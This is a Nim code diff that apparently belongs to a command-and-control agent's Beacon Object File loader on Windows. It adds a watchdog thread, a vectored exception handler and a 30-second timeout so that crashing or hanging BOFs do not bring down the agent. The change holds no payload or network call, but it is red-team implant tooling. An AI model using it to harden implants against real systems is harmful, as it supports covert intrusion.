@@ -42,6 +42,28 @@ when defined(windows):
   var gBofAllocs: seq[pointer]
   var gFmtBufs   = initTable[uint, string]()
 
+  # ── Watchdog globals ──────────────────────────────────────────────────────────
+  var gBofThreadId: DWORD = 0
+  var gBofCrashed: bool   = false
+
+  type BofCall = object
+    fn:      proc(args: pointer; len: int32) {.cdecl.}
+    argsPtr: pointer
+    argsLen: int32
+
+  proc bofVehHandler(ep: PEXCEPTION_POINTERS): LONG {.stdcall.} =
+    if gBofThreadId != 0 and GetCurrentThreadId() == gBofThreadId:
+      gBofCrashed = true
+      ExitThread(0)
+    return EXCEPTION_CONTINUE_SEARCH
+
+  proc bofThreadProc(p: LPVOID): DWORD {.stdcall.} =
+    let c = cast[ptr BofCall](p)
+    gBofThreadId = GetCurrentThreadId()
+    c.fn(c.argsPtr, c.argsLen)
+    gBofThreadId = 0
+    return 0
+
   # ── Little-endian byte readers ────────────────────────────────────────────────
 
   proc u16le(d: seq[byte]; o: int): uint16 {.inline.} =
@@ -537,11 +559,26 @@ when defined(windows):
         argsPtr = argsMem
         argsLen = int32(packedArgs.len)
 
-      # ── Execute BOF ────────────────────────────────────────────────────────
+      # ── Execute BOF via watchdog thread ───────────────────────────────────
       type BofEntry = proc(args: pointer; len: int32) {.cdecl.}
-      cast[BofEntry](entry)(argsPtr, argsLen)
-
-      result = gBofOutput
+      gBofCrashed = false
+      var bcall = BofCall(fn: cast[BofEntry](entry), argsPtr: argsPtr, argsLen: argsLen)
+      let veh   = AddVectoredExceptionHandler(1, bofVehHandler)
+      let hBof  = CreateThread(nil, 0, bofThreadProc, addr bcall, 0, nil)
+      if hBof == 0 or hBof == INVALID_HANDLE_VALUE:
+        discard RemoveVectoredExceptionHandler(veh)
+        cleanup(); return "BOF error: CreateThread failed"
+      let waited = WaitForSingleObject(hBof, 30000)
+      discard CloseHandle(hBof)
+      discard RemoveVectoredExceptionHandler(veh)
+      if waited == WAIT_TIMEOUT:
+        gBofAllocs = @[]  # don't free — BOF thread may still be running
+        gFmtBufs.clear()
+        return "[BOF timed out after 30s]"
+      if gBofCrashed:
+        result = gBofOutput & "\n[BOF crashed: hardware exception]"
+      else:
+        result = gBofOutput
 
     except CatchableError as e:
       result = "BOF error: " & e.msg
